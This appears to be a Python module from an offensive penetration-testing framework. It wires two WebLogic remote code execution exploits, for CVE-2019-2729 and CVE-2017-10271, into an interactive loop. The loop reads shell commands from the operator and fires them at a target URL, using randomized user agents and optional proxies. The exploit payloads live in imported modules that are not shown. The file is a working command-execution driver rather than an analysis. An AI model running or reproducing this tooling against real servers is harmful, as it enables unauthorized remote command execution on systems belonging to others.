from Modules.Weblogic import WebLogicRemoteCommandExecution
from Modules.Weblogic import WebLogicXMLDecoderDeserializationVulnerability
from ClassCongregation import AgentHeader,ExploitOutput
import os

#可交互式漏洞利用很难受列表
ExploitModuleList={
"CVE-2019-2729":WebLogicRemoteCommandExecution.exploit,
"CVE-2017-10271":WebLogicXMLDecoderDeserializationVulnerability.exploit,
}
def main(**kwargs):
    Module=kwargs.get("Exploit")
    Url=kwargs.get("Url")
    RandomAgent=AgentHeader().result(kwargs.get("AgentHeader"))#获取随机头
    Proxies=kwargs.get("Proxies")
    Sid = kwargs.get("Sid")
    Uid = kwargs.get("Uid")
    # p1 = Process(target=ExploitModuleList[Module], args=(Url, RandomAgent, Proxies,), kwargs={"Sid": Sid, "Uid": Uid})
    # p1.start()
    # print('parent process:', os.getppid())
    # print('process id:', os.getpid())
    OperatingSystem=ExploitOutput().OperatingSystem()#获取系统名称
    while True:
        try:
            Command = ExploitOutput().Command()  # 获取需要执行的命令
            ExploitModuleList[Module](Url, RandomAgent, Proxies,Command=Command,OperatingSystem=OperatingSystem,Sid=Sid,Uid=Uid)  # 调用列表里面的值

        except:  # 如果传入非法字符串会调用出错
            print("\033[31m[ ! ] Please enter the correct command to execute the module name\033[0m")
            os._exit(0)  # 直接退出整个函数
